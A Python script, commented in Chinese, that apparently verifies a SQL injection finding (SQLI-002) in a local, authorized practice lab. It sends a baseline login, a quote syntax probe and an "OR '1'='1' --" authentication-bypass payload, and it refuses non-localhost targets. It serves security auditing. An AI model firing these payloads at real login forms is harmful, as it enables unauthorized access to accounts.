#!/usr/bin/env python3
"""SQLI-002 本地授权靶场 SQL 注入验证草案（需人工适配）。

仅允许 localhost / 127.0.0.1 / ::1；拒绝跟随重定向；不打印响应正文与凭据。
请求参数名 uname、passwd 来自被审计代码；登录处理路径未提供，需用 --path 指定。
"""
import argparse
import hashlib
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
SUCCESS_MARKER = b"Your Login name:"
FAILURE_MARKER = b"slap.jpg"
ERROR_MARKERS = (
    b"You have an error in your SQL syntax",
    b"mysql_fetch_array",
    b"mysql_query",
    b"Fatal error",
    b"Parse error",
    b"Warning:",
)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect blocked: %s" % newurl, headers, fp
        )


def check_target(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("拒绝：仅允许 http/https，收到 %r" % parts.scheme)
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("拒绝：仅允许本地主机，收到 %r" % parts.hostname)
    return url


def load_cookie(path):
    if not path:
        return None
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if line.lower().startswith("cookie:"):
                return line.split(":", 1)[1].strip()
    raise SystemExit("会话文件缺少 'Cookie:' 行：%s" % path)


def send(opener, url, user_value, pass_value, cookie, timeout):
    payload = urllib.parse.urlencode(
        {"uname": user_value, "passwd": pass_value}
    ).encode("utf-8")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = cookie
    request = urllib.request.Request(url, data=payload, headers=headers, method="POST")
    try:
        with opener.open(request, timeout=timeout) as response:
            return {"status": response.status, "body": response.read(), "error": None}
    except urllib.error.HTTPError as exc:
        return {"status": exc.code, "body": b"", "error": "HTTPError"}
    except urllib.error.URLError as exc:
        return {"status": None, "body": b"", "error": "URLError: %s" % exc.reason}
    except (TimeoutError, ConnectionError) as exc:
        return {"status": None, "body": b"", "error": "%s: %s" % (type(exc).__name__, exc)}


def summarize(label, result):
    body = result["body"]
    markers = {
        "login_row": SUCCESS_MARKER in body,
        "failure_image": FAILURE_MARKER in body,
        "sql_or_php_error": any(marker in body for marker in ERROR_MARKERS),
    }
    digest = hashlib.sha256(body).hexdigest()[:12] if body else "-"
    print("[%s] status=%s error=%s bytes=%d sha256_12=%s %s" % (
        label, result["status"], result["error"], len(body), digest,
        " ".join("%s=%s" % (k, v) for k, v in markers.items()),
    ))
    return markers


def main():
    parser = argparse.ArgumentParser(description="SQLI-002 本地 SQL 注入验证草案")
    parser.add_argument("--base-url", default="http://127.0.0.1", help="靶场基址")
    parser.add_argument("--path", required=True, help="目标处理脚本路径，例如 /sqli/SQLI-002.php")
    parser.add_argument("--normal-user", default="lab_normal_user", help="基线专用测试账号名")
    parser.add_argument("--normal-pass", default="lab_normal_pass", help="基线专用测试口令")
    parser.add_argument("--session-file", default=None, help="本地会话文件，含 'Cookie: <value>' 行")
    parser.add_argument("--timeout", type=float, default=10.0, help="单次请求超时秒数")
    args = parser.parse_args()

    url = check_target(args.base_url.rstrip("/") + "/" + args.path.lstrip("/"))
    cookie = load_cookie(args.session_file)
    opener = urllib.request.build_opener(NoRedirect)

    baseline = send(opener, url, args.normal_user, args.normal_pass, cookie, args.timeout)
    base_markers = summarize("baseline", baseline)

    syntax = send(opener, url, "lab_probe'", "lab_probe", cookie, args.timeout)
    syntax_markers = summarize("syntax-probe", syntax)

    bypass = send(opener, url, "lab_probe' OR '1'='1' -- ", "lab_probe", cookie, args.timeout)
    bypass_markers = summarize("tautology-probe", bypass)

    print()
    if baseline["error"] or syntax["error"] or bypass["error"]:
        print("结论：请求未全部完成（连接/协议/重定向错误），本次未获得可比较证据。")
        return 2
    if base_markers["login_row"]:
        print("结论：基线使用了有效账号，不能作为未认证对照；请换用无效测试口令后重跑。")
        return 3
    if bypass_markers["login_row"] and not base_markers["login_row"]:
        print("观察：基线未返回用户行，恒真输入返回用户行，符合字符串拼接导致认证绕过的特征；")
        print("仍需人工核查响应内容、服务器日志与代码行 16-17，不能仅凭本脚本断定漏洞成立。")
        return 0
    print("观察：未出现预期的行返回差异；可能是防护、路径错误、接口不兼容或条件不满足。")
    print("语法探针 sql_or_php_error=%s，仅作线索，不单独证明注入。" % syntax_markers["sql_or_php_error"])
    return 1


if __name__ == "__main__":
    sys.exit(main())
